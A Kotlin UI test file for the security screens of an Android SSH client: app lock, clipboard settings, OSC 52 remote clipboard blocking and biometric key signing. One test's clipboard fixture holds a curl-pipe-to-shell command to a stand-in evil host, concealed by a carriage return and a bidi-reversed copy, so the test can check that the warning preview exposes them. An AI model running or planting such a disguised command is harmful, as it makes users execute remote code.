package app.berth.android.screenshots

import android.app.Application
import android.content.ClipboardManager
import android.content.Context
import android.security.keystore.KeyPermanentlyInvalidatedException
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.runtime.Composable
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.remember
import androidx.compose.ui.Modifier
import androidx.compose.ui.test.assertCountEquals
import androidx.compose.ui.test.assertIsDisplayed
import androidx.compose.ui.test.assertIsEnabled
import androidx.compose.ui.test.assertIsNotEnabled
import androidx.compose.ui.test.hasContentDescription
import androidx.compose.ui.test.hasSetTextAction
import androidx.compose.ui.test.hasText
import androidx.compose.ui.test.junit4.createComposeRule
import androidx.compose.ui.test.onAllNodesWithText
import androidx.compose.ui.test.onFirst
import androidx.compose.ui.test.onNodeWithContentDescription
import androidx.compose.ui.test.onNodeWithText
import androidx.compose.ui.test.performClick
import androidx.compose.ui.test.performScrollTo
import androidx.compose.ui.test.performTextReplacement
import androidx.test.core.app.ApplicationProvider
import app.berth.android.security.AuthOutcome
import app.berth.android.security.FakeAuthenticator
import app.berth.android.security.FakeKeystore
import app.berth.android.security.LockState
import app.berth.android.session.ManagedTab
import app.berth.android.session.Prompt
import app.berth.android.ui.AppRoot
import app.berth.android.ui.hosts.HostEditorScreen
import app.berth.android.ui.prompts.PromptHost
import app.berth.android.ui.security.LockWindow
import app.berth.android.ui.security.RemoteClipboardNoticeSheet
import app.berth.android.ui.settings.SettingsScreen
import app.berth.android.ui.stage.StageScreen
import app.berth.android.ui.tabs.ShellTabActions
import app.berth.android.ui.tabs.TabActions
import app.berth.android.ui.tabs.TabUiState
import app.berth.android.ui.theme.BerthTheme
import app.berth.data.crypto.KeyAuthModel
import app.berth.domain.model.AuthMethod
import app.berth.domain.model.ClipboardClear
import app.berth.domain.model.Host
import app.berth.domain.model.Identity
import app.berth.domain.model.InterfaceTheme
import app.berth.domain.model.KeyAlgorithm
import app.berth.domain.model.KeyProtection
import app.berth.domain.model.KeyStorage
import app.berth.domain.model.KnownHostKey
import app.berth.domain.model.LockTimeout
import app.berth.domain.model.PersistenceLayer
import app.berth.domain.model.RemoteClipboardPolicy
import app.berth.domain.model.SecuritySettings
import app.berth.domain.model.SessionRecord
import app.berth.domain.model.SessionState
import app.berth.domain.model.SwatchColor
import app.berth.domain.model.Workspace
import app.berth.ssh.SshKeys
import app.berth.ssh.SshSecurity
import com.github.takahirom.roborazzi.captureScreenRoboImage
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotEquals
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Assume.assumeTrue
import org.junit.Before
import org.junit.Rule
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config
import org.robolectric.annotation.GraphicsMode
import java.io.ByteArrayOutputStream
import java.io.DataOutputStream
import java.io.File
import java.security.KeyPair
import java.util.Base64
import java.util.concurrent.TimeUnit

/**
 * The security screens (spec C20) through Robolectric's native graphics: the lock window over the
 * shell (stacked in one composition the way the two windows stack on a device), Settings ›
 * Security, the host's remote clipboard override, the one-time notice for a blocked OSC 52 write,
 * and the connect flow paused on the biometric step with its cancel, invalidated-key and
 * regenerated outcomes. The system prompt is a scripted fake and the Keystore a software P-256
 * stand-in; `live keystore key signs in` puts that stand-in's signature in front of the local sshd
 * when the `SSH_TEST_*` variables and `SSH_TEST_P256_KEY_FILE` are set.
 */
@RunWith(RobolectricTestRunner::class)
@GraphicsMode(GraphicsMode.Mode.NATIVE)
@Config(sdk = [35], application = Application::class, qualifiers = "w411dp-h914dp-420dpi")
class SecurityScreenshotTest {
    @get:Rule
    val compose = createComposeRule()

    private val outDir = File(System.getProperty("user.dir"), "build/outputs/roborazzi")
    private val context: Context = ApplicationProvider.getApplicationContext()
    private lateinit var graph: TestGraph

    private val sshHost = System.getenv("SSH_TEST_HOST").orEmpty()
    private val sshPort = System.getenv("SSH_TEST_PORT").orEmpty().toIntOrNull() ?: 22
    private val sshUser = System.getenv("SSH_TEST_USER").orEmpty()
    private val p256KeyFile = System.getenv("SSH_TEST_P256_KEY_FILE").orEmpty()

    @Before
    fun setUp() {
        if (System.getProperty("roborazzi.test.record") == null && System.getProperty("roborazzi.test.verify") == null) {
            System.setProperty("roborazzi.test.record", "true")
        }
        SshSecurity.ensureProviders()
        outDir.mkdirs()
        graph = TestGraph(context)
    }

    private fun capture(name: String) {
        compose.waitForIdle()
        captureScreenRoboImage(File(outDir, "$name.png").path)
    }

    private fun themed(content: @Composable () -> Unit) {
        compose.setContent {
            BerthTheme(InterfaceTheme.DEFAULT) {
                Box(Modifier.fillMaxSize()) { content() }
            }
        }
    }

    @Composable
    private fun tabActions(): TabActions = remember { ShellTabActions(graph.viewModel, TabUiState(), onActivated = {}) }

    @Composable
    private fun Stage(tab: ManagedTab?) {
        StageScreen(graph.viewModel, tab, tabActions(), onOpenDrawer = {}, onOpenSessionSheet = {}, onEditHost = {})
    }

    /** The Stage following the active tab, with the prompt sheets over it, as the shell mounts them. */
    @Composable
    private fun StageWithPrompts() {
        val active by graph.viewModel.activeTab.collectAsState()
        Stage(active)
        PromptHost(graph.prompts)
        RemoteClipboardNoticeSheet(graph.remoteClipboard)
    }

    private val clipboard: ClipboardManager get() = context.getSystemService(ClipboardManager::class.java)
    private val clipText: String? get() = clipboard.primaryClip?.getItemAt(0)?.text?.toString()

    /** Real time passes while the compose clock keeps ticking. */
    private fun settle(ms: Long) {
        val end = System.currentTimeMillis() + ms
        while (System.currentTimeMillis() < end) {
            compose.mainClock.advanceTimeBy(64)
            compose.waitForIdle()
            Thread.sleep(16)
        }
    }

    private fun hasNoText(text: String) = compose.onAllNodesWithText(text).assertCountEquals(0)

    /** The two windows as they stack on a device: the shell's, and the lock's over it while the app is locked. */
    private fun shellUnderLockWindow() {
        compose.setContent {
            AppRoot(graph.viewModel)
            LockWindow(graph.security, InterfaceTheme.DEFAULT)
        }
    }

    private val strip get() = compose.onAllNodes(hasContentDescription("Tabs, 3 open"))

    // ---- app lock ---------------------------------------------------------------------------------

    @Test
    fun `lock window covers the shell until the prompt succeeds`() {
        seedLibrary()
        seedDetachedSessions()
        graph.settings.security.value = SecuritySettings(appLock = true, lockTimeout = LockTimeout.IMMEDIATELY)
        runBlocking { graph.settings.setLastActiveSessionId("s-homelab") }
        // The activity started: a cold start with the lock on resolves to locked before any frame.
        graph.appLock.onForeground()
        assertEquals(LockState.LOCKED, graph.appLock.state.value)

        shellUnderLockWindow()
        // The lock screen runs the system prompt as soon as it appears; the fake leaves it up.
        compose.waitUntil(5_000) { graph.authenticator.pending }
        compose.onNodeWithText("Locked").assertIsDisplayed()
        compose.onNodeWithText("Unlocking\u2026").assertIsNotEnabled()
        // The shell is composed beneath, covered: the tabs come back and the last one takes the
        // stage under the lock, so the unlock has nothing to rebuild.
        compose.waitUntil(10_000) { graph.viewModel.activeTabId.value == "s-homelab" }
        compose.waitUntil(5_000) { strip.fetchSemanticsNodes().isNotEmpty() }
        capture("lock-screen-prompting")

        // Backing out of the system prompt leaves the lock screen with its own button and nothing to explain.
        graph.authenticator.answer(AuthOutcome.Cancelled)
        compose.waitUntil(5_000) { compose.onAllNodesWithText("Unlock").fetchSemanticsNodes().isNotEmpty() }
        compose.onNodeWithText("Unlock").assertIsEnabled()
        capture("lock-screen")

        // The prompt ending in an error (lockout, no hardware) says why, in place of the standing text.
        compose.onNodeWithText("Unlock").performClick()
        compose.waitUntil(5_000) { graph.authenticator.pending }
        graph.authenticator.answer(AuthOutcome.Failed("Too many attempts. Try again later."))
        compose.waitUntil(5_000) { compose.onAllNodesWithText("Too many attempts. Try again later.").fetchSemanticsNodes().isNotEmpty() }
        capture("lock-screen-failed")

        // Success takes the lock window and the cover away; the shell was there all along.
        compose.onNodeWithText("Unlock").performClick()
        compose.waitUntil(5_000) { graph.authenticator.pending }
        graph.authenticator.answer(FakeAuthenticator.SUCCEEDED)
        compose.waitUntil(5_000) { compose.onAllNodesWithText("Locked").fetchSemanticsNodes().isEmpty() }
        strip.onFirst().assertIsDisplayed()
        assertEquals("s-homelab", graph.viewModel.activeTabId.value)
        assertEquals(listOf("Unlock Berth", "Unlock Berth", "Unlock Berth"), graph.authenticator.requests.map { it.title })

        // Leaving and coming back with "Immediately" locks again, over the same running shell; the
        // lock window asks on its own the moment it is up.
        graph.appLock.onBackground(changingConfigurations = false)
        graph.appLock.onForeground()
        compose.waitUntil(5_000) { compose.onAllNodesWithText("Locked").fetchSemanticsNodes().isNotEmpty() }
        compose.waitUntil(5_000) { graph.authenticator.pending }
        strip.assertCountEquals(1)
        graph.authenticator.answer(FakeAuthenticator.SUCCEEDED)
        compose.waitUntil(5_000) { compose.onAllNodesWithText("Locked").fetchSemanticsNodes().isEmpty() }
        strip.onFirst().assertIsDisplayed()
        assertEquals("the tabs restored once survived the lock", "s-homelab", graph.viewModel.activeTabId.value)

        // A rotation is not leaving: the shell stays.
        graph.appLock.onBackground(changingConfigurations = true)
        graph.clock.advance(TimeUnit.HOURS.toMillis(1))
        graph.appLock.onForeground()
        compose.waitForIdle()
        hasNoText("Locked")
        strip.onFirst().assertIsDisplayed()
    }

    @Test
    fun `an edit in progress survives the lock`() {
        seedLibrary()
        seedDetachedSessions()
        graph.settings.security.value = SecuritySettings(appLock = true, lockTimeout = LockTimeout.IMMEDIATELY)
        runBlocking { graph.settings.setLastActiveSessionId("s-homelab") }
        graph.appLock.onForeground()
        // The launch's prompt passes at once.
        graph.authenticator.queue(FakeAuthenticator.SUCCEEDED)
        shellUnderLockWindow()
        compose.waitUntil(10_000) { graph.appLock.state.value == LockState.UNLOCKED && graph.viewModel.activeTabId.value == "s-homelab" }
        compose.waitUntil(5_000) { strip.fetchSemanticsNodes().isNotEmpty() }

        // Into homelab's editor through the Stage's menu, and two fields changed but not saved.
        compose.onNodeWithContentDescription("More").performClick()
        compose.waitUntil(5_000) { compose.onAllNodesWithText("Host settings").fetchSemanticsNodes().isNotEmpty() }
        compose.onNodeWithText("Host settings").performClick()
        compose.waitUntil(5_000) { compose.onAllNodes(hasSetTextAction() and hasText("homelab")).fetchSemanticsNodes().isNotEmpty() }
        compose.onNode(hasSetTextAction() and hasText("homelab")).performTextReplacement("homelab (rack 2)")
        compose.onNode(hasSetTextAction() and hasText("192.168.1.20")).performTextReplacement("192.168.1.21")
        compose.onNode(hasSetTextAction() and hasText("homelab (rack 2)")).assertIsDisplayed()

        // Leaving for a password manager and coming back with "Immediately": the lock falls over the editor.
        graph.appLock.onBackground(changingConfigurations = false)
        graph.appLock.onForeground()
        compose.waitUntil(5_000) { compose.onAllNodesWithText("Locked").fetchSemanticsNodes().isNotEmpty() }
        compose.waitUntil(5_000) { graph.authenticator.pending }
        compose.onNode(hasSetTextAction() and hasText("homelab (rack 2)")).assertExists()

        // The unlock finds the editor as it was left: both edits in their fields, nothing saved by the lock.
        graph.authenticator.answer(FakeAuthenticator.SUCCEEDED)
        compose.waitUntil(5_000) { compose.onAllNodesWithText("Locked").fetchSemanticsNodes().isEmpty() }
        compose.onNode(hasSetTextAction() and hasText("homelab (rack 2)")).assertIsDisplayed()
        compose.onNode(hasSetTextAction() and hasText("192.168.1.21")).assertIsDisplayed()
        compose.onNodeWithText("Save").assertIsDisplayed()
        assertEquals("homelab", graph.hosts.items.value.first { it.id == "homelab" }.name)
        capture("host-editor-survives-lock")
    }

    // ---- settings ---------------------------------------------------------------------------------

    @Test
    fun `security settings`() {
        seedLibrary()
        themed { SettingsScreen(graph.viewModel, onBack = {}, onKnownHosts = {}) }
        compose.onNodeWithText("App lock").performScrollTo()
        compose.waitForIdle()
        // The defaults: everything off, the timeout row hidden until the lock is on.
        hasNoText("Lock after leaving")
        compose.onNodeWithText("Known hosts").performScrollTo()
        capture("settings-security")

        // Turning the lock on runs the prompt once first, so a lock nobody can pass is never saved.
        graph.authenticator.queue(FakeAuthenticator.SUCCEEDED)
        compose.onNodeWithText("App lock").performClick()
        compose.waitUntil(5_000) { graph.settings.security.value.appLock }
        assertEquals(listOf("Turn on app lock"), graph.authenticator.requests.map { it.title })
        compose.waitUntil(5_000) { compose.onAllNodesWithText("Lock after leaving").fetchSemanticsNodes().isNotEmpty() }

        compose.onNodeWithText("Lock after leaving").performClick()
        compose.waitUntil(5_000) { compose.onAllNodesWithText("5 minutes").fetchSemanticsNodes().isNotEmpty() }
        capture("settings-security-timeout-menu")
        compose.onNodeWithText("1 minute").performClick()
        compose.waitUntil(5_000) { graph.settings.security.value.lockTimeout == LockTimeout.ONE_MINUTE }

        compose.onNodeWithText("Block screenshots").performClick()
        compose.waitUntil(5_000) { graph.settings.security.value.blockScreenshots }
        compose.onNodeWithText("Clear clipboard").performClick()
        compose.waitUntil(5_000) { compose.onAllNodesWithText("After 30 seconds").fetchSemanticsNodes().isNotEmpty() }
        compose.onNodeWithText("After 30 seconds").performClick()
        compose.waitUntil(5_000) { graph.settings.security.value.clipboardClear == ClipboardClear.THIRTY_SECONDS }
        assertFalse("the remote clipboard stays off", graph.settings.security.value.remoteClipboard)
        compose.onNodeWithText("Known hosts").performScrollTo()
        compose.waitForIdle()
        capture("settings-security-on")

        // Off again: no prompt to turn it off, and the timeout row goes with it.
        compose.onNodeWithText("App lock").performClick()
        compose.waitUntil(5_000) { !graph.settings.security.value.appLock }
        assertEquals(1, graph.authenticator.requests.size)
        compose.waitUntil(5_000) { compose.onAllNodesWithText("Lock after leaving").fetchSemanticsNodes().isEmpty() }
    }

    @Test
    fun `security settings without a screen lock`() {
        seedLibrary()
        graph.authenticator.deviceSecure = false
        themed { SettingsScreen(graph.viewModel, onBack = {}, onKnownHosts = {}) }
        compose.onNodeWithText("App lock").performScrollTo()
        compose.onNodeWithText("Set a screen lock on this device first").assertIsDisplayed()
        compose.onNodeWithText("App lock").assertIsNotEnabled()
        compose.onNodeWithText("App lock").performClick()
        compose.waitForIdle()
        assertFalse(graph.settings.security.value.appLock)
        assertTrue("nothing to prompt with", graph.authenticator.requests.isEmpty())
        compose.onNodeWithText("Known hosts").performScrollTo()
        compose.waitForIdle()
        capture("settings-security-no-screen-lock")
    }

    @Test
    fun `host editor remote clipboard override commits with Save`() {
        seedLibrary()
        var done = 0
        themed { HostEditorScreen(graph.viewModel, hostId = "pi-hole", onDone = { done++ }) }
        compose.waitUntil(5_000) { compose.onAllNodes(hasText("pi-hole")).fetchSemanticsNodes().isNotEmpty() }
        compose.onNodeWithText("Remote clipboard").performScrollTo()
        compose.onNodeWithText("Inherit (blocked)").assertIsDisplayed()
        compose.onNodeWithText("Clipboard writes from this server (OSC 52)").assertIsDisplayed()
        capture("host-editor-remote-clipboard")
        compose.onNodeWithText("Remote clipboard").performClick()
        compose.waitUntil(5_000) { compose.onAllNodesWithText("Allow").fetchSemanticsNodes().isNotEmpty() }
        compose.onNodeWithText("Allow").performClick()
        compose.waitUntil(5_000) { compose.onAllNodesWithText("Allow").fetchSemanticsNodes().isNotEmpty() }
        compose.waitForIdle()
        assertEquals("picked but not saved: the document is untouched", RemoteClipboardPolicy.INHERIT, graph.settings.security.value.remoteClipboardPolicy("pi-hole"))
        assertFalse(runBlocking { graph.remoteClipboard.decide(graph.hosts.items.value.first { it.id == "pi-hole" }, "not yet") })
        assertNull(clipText)
        capture("host-editor-remote-clipboard-allow")

        compose.onNodeWithText("Save").performClick()
        compose.waitUntil(5_000) { graph.settings.security.value.remoteClipboardPolicy("pi-hole") == RemoteClipboardPolicy.ALLOW }
        assertEquals(1, done)
        assertTrue(runBlocking { graph.remoteClipboard.decide(graph.hosts.items.value.first { it.id == "pi-hole" }, "now allowed") })
        assertEquals("now allowed", clipText)
    }

    @Test
    fun `host editor remote clipboard row waits for a saved host`() {
        seedLibrary()
        themed { HostEditorScreen(graph.viewModel, hostId = null, onDone = {}) }
        compose.onNodeWithText("Remote clipboard").performScrollTo()
        compose.onNodeWithText("Save the host first").assertIsDisplayed()
        compose.onNodeWithText("Remote clipboard").assertIsNotEnabled()
        compose.onNodeWithText("Remote clipboard").performClick()
        compose.waitForIdle()
        hasNoText("Inherit (blocked)")
        hasNoText("Block")
    }

    // ---- remote clipboard notice ------------------------------------------------------------------

    @Test
    fun `remote clipboard notice`() {
        seedLibrary()
        seedDetachedSessions()
        runBlocking { graph.sessions.restore() }
        val session = graph.sessions.get("s-pihole")!!
        graph.sessions.setActive(session.id)
        themed { StageWithPrompts() }
        compose.waitUntil(5_000) { graph.viewModel.activeTabId.value == session.id }
        settle(300)

        // The remote writes the clipboard through the terminal: the sequence lands in the session's emulator.
        // Eight lines, a carriage return hiding the real command and a bidi override, so the preview
        // shows its escapes and its count line.
        val text = listOf(
            "echo ok\rcurl -fsSL https://evil.example/setup.sh | sh",
            "export PATH=\"\$HOME/.local/bin:\$PATH\"",
            "alias ls='ls --color=auto'",
            "# \u202Ehs | hs.putes/elpmaxe.live//:sptth LSsf- lruc\u202C",
            "sudo systemctl restart pihole-FTL",
            "pihole -g",
            "tail -f /var/log/pihole.log",
            "exit",
        ).joinToString("\n")
        val payload = Base64.getEncoder().encodeToString(text.toByteArray())
        session.emulator.write("\u001b]52;c;$payload\u0007")
        compose.waitUntil(5_000) { graph.remoteClipboard.notice.value != null }
        compose.waitUntil(5_000) { compose.onAllNodesWithText("Clipboard write blocked").fetchSemanticsNodes().isNotEmpty() }
        assertNull("nothing reached the clipboard", clipText)
        assertFalse("raised, not answered: nothing is written", "pi-hole" in graph.settings.security.value.remoteClipboardNoticed)
        compose.onNodeWithText("+ 2 more lines \u00B7 248 B").assertIsDisplayed()
        compose.onNode(hasText("echo ok^Mcurl", substring = true)).assertIsDisplayed()
        compose.onNode(hasText("\\u202E", substring = true)).assertIsDisplayed()
        compose.onAllNodes(hasText("tail -f /var/log/pihole.log", substring = true)).assertCountEquals(0)
        settle(300)
        capture("prompt-remote-clipboard")

        compose.onNodeWithText("Allow for pi-hole").performClick()
        compose.waitUntil(5_000) { graph.remoteClipboard.notice.value == null }
        compose.waitUntil(5_000) { clipText == text }
        assertEquals(RemoteClipboardPolicy.ALLOW, graph.settings.security.value.remoteClipboardPolicy("pi-hole"))
        assertTrue("pi-hole" in graph.settings.security.value.remoteClipboardNoticed)
        assertFalse(graph.settings.security.value.remoteClipboard)

        // From now on this host's writes land without a word; another host's first one still asks.
        session.emulator.write("\u001b]52;c;${Base64.getEncoder().encodeToString("second write".toByteArray())}\u0007")
        compose.waitUntil(5_000) { clipText == "second write" }
        hasNoText("Clipboard write blocked")
    }

    // ---- biometric gating -------------------------------------------------------------------------

    @Test
    fun `connect flow paused on the biometric step, cancelled, invalidated and regenerated`() {
        val keystore = FakeKeystore(KeyAuthModel.PER_USE)
        graph.keystore = keystore
        seedLibrary(phoneKey = keystore.pair)
        val pihole = graph.hosts.items.value.first { it.id == "pi-hole" }
        runBlocking { graph.sessions.restore() }
        themed { StageWithPrompts() }

        // Opening a host whose key lives in the Keystore asks before anything is sent to the server.
        graph.viewModel.open(pihole)
        compose.waitUntil(10_000) { graph.prompts.current.value is Prompt.UnlockKey }
        compose.waitUntil(5_000) { compose.onAllNodesWithText("Sign in to pi-hole").fetchSemanticsNodes().isNotEmpty() }
        val session = graph.sessions.activeSession.value!!
        assertEquals(SessionState.CONNECTING, session.state)
        val request = graph.authenticator.requests.single()
        assertEquals("Sign in to pi-hole", request.title)
        assertEquals("Confirm to sign with the key \u201Cthis phone\u201D", request.subtitle)
        assertNotNull("the prompt carries the Signature that will sign", request.signature)
        settle(300)
        capture("connect-biometric-step")

        // Cancel on the sheet withdraws the system prompt; the tab fails plainly, naming the key and the host.
        compose.onNodeWithText("Cancel").performClick()
        compose.waitUntil(10_000) { session.state == SessionState.FAILED }
        compose.waitUntil(5_000) { compose.onAllNodesWithText("Cancelled before the key \u201Cthis phone\u201D could sign, so Berth did not sign in to pi-hole.").fetchSemanticsNodes().isNotEmpty() }
        assertFalse(graph.authenticator.pending)
        assertNull(graph.prompts.current.value)
        settle(300)
        capture("connect-biometric-cancelled")

        // Retry with a key Android has invalidated (new biometrics enrolled): named, with the way out.
        keystore.failures += KeyPermanentlyInvalidatedException()
        val before = runBlocking { graph.identities.get("id-phone") }!!
        graph.viewModel.reconnect(session.id)
        compose.waitUntil(10_000) { graph.prompts.current.value is Prompt.KeyInvalidated }
        compose.waitUntil(5_000) { compose.onAllNodesWithText("Key no longer usable").fetchSemanticsNodes().isNotEmpty() }
        assertEquals("no system prompt for a key that can never sign", 1, graph.authenticator.requests.size)
        settle(300)
        capture("prompt-key-invalidated")

        compose.onNodeWithText("Regenerate key").performClick()
        compose.waitUntil(10_000) { session.state == SessionState.FAILED && graph.prompts.current.value == null }
        compose.waitUntil(5_000) { compose.onAllNodesWithText("The key \u201Cthis phone\u201D has a new key pair. Add its public key to pi-hole (Keys, Copy public key), then connect again.").fetchSemanticsNodes().isNotEmpty() }
        val after = runBlocking { graph.identities.get("id-phone") }!!
        assertNotEquals(before.publicKeyOpenSsh, after.publicKeyOpenSsh)
        assertEquals(SshKeys.openSshPublic(keystore.pair.public, "berth@pixel"), after.publicKeyOpenSsh)
        assertEquals(listOf("berth-id-phone" to KeyProtection.BIOMETRIC), keystore.regenerated)
        settle(300)
        capture("connect-key-regenerated")
    }

    // ---- live against the local sshd --------------------------------------------------------------

    @Test
    fun `live keystore key signs in`() {
        assumeTrue("SSH_TEST_HOST not set", sshHost.isNotBlank())
        assumeTrue("SSH_TEST_P256_KEY_FILE not set", p256KeyFile.isNotBlank())
        // The Keystore stand-in holds the P-256 key whose public half is in the demo user's authorized_keys.
        val loaded = SshKeys.load(File(p256KeyFile).readText())
        val keystore = FakeKeystore(KeyAuthModel.PER_USE, KeyPair(loaded.public, loaded.private))
        graph.keystore = keystore
        seedLibrary(phoneKey = keystore.pair)
        val box = Host(
            id = "berth-test-box",
            name = "Berth test box",
            color = SwatchColor.TEAL,
            monogram = Host.monogramFor("Berth test box"),
            address = sshHost,
            port = sshPort,
            user = sshUser,
            auth = AuthMethod.Key("id-phone"),
            tags = listOf("local"),
            createdAt = now - TimeUnit.HOURS.toMillis(1),
        )
        runBlocking { graph.hosts.upsert(box) }

        compose.setContent { AppRoot(graph.viewModel) }
        compose.waitUntil(10_000) { graph.sessions.restored.value }
        graph.viewModel.open(box)
        compose.waitUntil(10_000) { graph.prompts.current.value is Prompt.UnlockKey }
        compose.waitUntil(5_000) { compose.onAllNodesWithText("Sign in to Berth test box").fetchSemanticsNodes().isNotEmpty() }
        settle(300)
        capture("connect-biometric-step-live")

        // The user confirms: the Signature the prompt carried signs the challenge, and the sshd checks it.
        graph.authenticator.answer(FakeAuthenticator.SUCCEEDED)
        compose.waitUntil(20_000) { graph.prompts.current.value is Prompt.TrustHostKey }
        compose.onNodeWithText("Trust and connect").performClick()
        compose.waitUntil(45_000) { graph.sessions.activeSession.value?.state == SessionState.LIVE }
        val session = graph.sessions.activeSession.value!!
        assertNotNull(graph.authenticator.requests.single().signature)
        settle(1_200)
        session.sendText("export PS1='\\[\\e[38;5;108m\\]\\u@berth\\[\\e[0m\\]:\\[\\e[38;5;179m\\]\\w\\[\\e[0m\\]\\$ ' && clear && echo signed in with the keystore key && id\n")
        settle(1_200)
        capture("stage-live-keystore-key")

        // A program on the server writes the clipboard: held back and explained, once.
        val first = Base64.getEncoder().encodeToString("hello from demo".toByteArray())
        session.sendText("printf '\\033]52;c;$first\\007'\n")
        compose.waitUntil(15_000) { graph.remoteClipboard.notice.value != null }
        compose.waitUntil(5_000) { compose.onAllNodesWithText("Clipboard write blocked").fetchSemanticsNodes().isNotEmpty() }
        assertNull(clipText)
        settle(300)
        capture("prompt-remote-clipboard-live")
        compose.onNodeWithText("Allow for Berth test box").performClick()
        compose.waitUntil(5_000) { clipText == "hello from demo" }

        // Allowed now: the next write lands with no notice.
        val second = Base64.getEncoder().encodeToString("second write from demo".toByteArray())
        session.sendText("printf '\\033]52;c;$second\\007'\n")
        compose.waitUntil(15_000) { clipText == "second write from demo" }
        hasNoText("Clipboard write blocked")

        graph.sessions.sessions.value.forEach { graph.sessions.close(it.id) }
    }

    // ---- fixtures ---------------------------------------------------------------------------------

    private val now = System.currentTimeMillis()

    private fun host(id: String, name: String, address: String, user: String, color: SwatchColor, auth: AuthMethod, lastConnectedAgoMinutes: Long? = null) = Host(
        id = id,
        name = name,
        color = color,
        monogram = Host.monogramFor(name),
        address = address,
        port = 22,
        user = user,
        auth = auth,
        lastConnectedAt = lastConnectedAgoMinutes?.let { now - TimeUnit.MINUTES.toMillis(it) },
        createdAt = now - TimeUnit.DAYS.toMillis(30),
    )

    /** Three hosts, two keys; the phone's Keystore key is [phoneKey] when the test stands the Keystore in. */
    private fun seedLibrary(phoneKey: KeyPair = FakeKeystore.newP256()) = runBlocking {
        val ed = SshKeys.generate(KeyAlgorithm.ED25519)
        graph.identities.insert(
            Identity("id-laptop", "laptop ed25519", KeyAlgorithm.ED25519, KeyStorage.SOFTWARE_ENCRYPTED, KeyProtection.PASSPHRASE, SshKeys.openSshPublic(ed.public, "ben@laptop"), SshKeys.fingerprintSha256(ed.public), "ben@laptop", createdAt = now - TimeUnit.DAYS.toMillis(200)),
            SshKeys.openSshPrivate(ed, "ben@laptop", "correct horse".toCharArray()).toByteArray(),
        )
        graph.identities.insert(
            Identity("id-phone", "this phone", KeyAlgorithm.ECDSA_P256, KeyStorage.ANDROID_KEYSTORE, KeyProtection.BIOMETRIC, SshKeys.openSshPublic(phoneKey.public, "berth@pixel"), SshKeys.fingerprintSha256(phoneKey.public), "berth@pixel", keystoreAlias = "berth-id-phone", createdAt = now - TimeUnit.DAYS.toMillis(12)),
            null,
        )
        graph.hosts.upsert(host("prod-api", "prod-api", "203.0.113.10", "deploy", SwatchColor.COPPER, AuthMethod.Key("id-laptop"), lastConnectedAgoMinutes = 130))
        graph.hosts.upsert(host("homelab", "homelab", "192.168.1.20", "ben", SwatchColor.VERDIGRIS, AuthMethod.Password("host-password:homelab"), lastConnectedAgoMinutes = 18))
        graph.hosts.upsert(host("pi-hole", "pi-hole", "192.168.1.2", "pi", SwatchColor.MOSS, AuthMethod.Key("id-phone"), lastConnectedAgoMinutes = 60 * 26))
        graph.workspaces.upsert(Workspace(Workspace.DEFAULT_ID, Workspace.DEFAULT_NAME, SwatchColor.COPPER, "H", sortOrder = 0, createdAt = now - TimeUnit.DAYS.toMillis(30)))
        graph.workspaces.upsert(Workspace("ws-work", "Work", SwatchColor.SLATE, "W", sortOrder = 1, createdAt = now - TimeUnit.DAYS.toMillis(20)))
        graph.settings.setCurrentWorkspaceId(Workspace.DEFAULT_ID)
        graph.knownHosts.upsert(KnownHostKey("kh-1", "203.0.113.10", 22, "ssh-ed25519", SshKeys.openSshPublic(ed.public).split(" ")[1], SshKeys.fingerprintSha256(ed.public), now - TimeUnit.DAYS.toMillis(90), now - TimeUnit.HOURS.toMillis(2)))
        val build = SshKeys.generate(KeyAlgorithm.ED25519).public
        graph.knownHosts.upsert(KnownHostKey("kh-3", "build.internal", 22, "ssh-ed25519", SshKeys.openSshPublic(build).split(" ")[1], SshKeys.fingerprintSha256(build), now - TimeUnit.DAYS.toMillis(200), now - TimeUnit.DAYS.toMillis(1), pinned = true))
    }

    private fun seedDetachedSessions() = runBlocking {
        val hosts = graph.hosts.items.value.associateBy { it.id }
        fun record(id: String, hostId: String, ws: String, order: Int, lastLiveMinutesAgo: Long, cwd: String?, lastCommand: String?) = SessionRecord(
            id = id,
            workspaceId = ws,
            hostId = hostId,
            hostSnapshot = hosts.getValue(hostId),
            state = SessionState.DETACHED,
            layer = PersistenceLayer.LOCAL_FRAME,
            title = hosts.getValue(hostId).name,
            cwd = cwd,
            lastCommand = lastCommand,
            sortOrder = order,
            createdAt = now - TimeUnit.HOURS.toMillis(5),
            lastLiveAt = now - TimeUnit.MINUTES.toMillis(lastLiveMinutesAgo),
        )
        graph.sessionRecords.upsert(record("s-homelab", "homelab", Workspace.DEFAULT_ID, 0, 12, "~/srv", "docker compose ps"))
        graph.sessionRecords.upsert(record("s-pihole", "pi-hole", Workspace.DEFAULT_ID, 1, 95, "/etc/pihole", "tail -f pihole.log"))
        graph.sessionRecords.upsert(record("s-prod", "prod-api", "ws-work", 2, 400, "~", "journalctl -u api -f"))
        graph.sessionRecords.saveFrame(
            "s-homelab",
            frame(
                listOf(
                    "ben@homelab:~/srv$ docker compose ps",
                    "NAME        IMAGE               STATUS        PORTS",
                    "caddy       caddy:2             Up 3 days     80/tcp, 443/tcp",
                    "gitea       gitea/gitea:1.22    Up 3 days     3000/tcp",
                    "ben@homelab:~/srv$ ",
                ),
            ),
        )
        graph.sessionRecords.saveFrame("s-pihole", frame(listOf("pi@pi-hole:/etc/pihole$ tail -f pihole.log", "Sep 18 20:41:02 dnsmasq[712]: query[A] api.berth.app from 192.168.1.30", "Sep 18 20:41:02 dnsmasq[712]: forwarded api.berth.app to 1.1.1.1")))
        graph.sessionRecords.saveFrame("s-prod", frame(listOf("deploy@prod-api:~$ journalctl -u api -f", "Sep 18 19:02:11 prod-api api[2210]: listening on :8080", "deploy@prod-api:~$ ")))
    }

    private fun frame(lines: List<String>): ByteArray {
        val out = ByteArrayOutputStream()
        DataOutputStream(out).use { d ->
            d.writeInt(1)
            d.writeInt(lines.size)
            lines.forEach(d::writeUTF)
        }
        return out.toByteArray()
    }
}
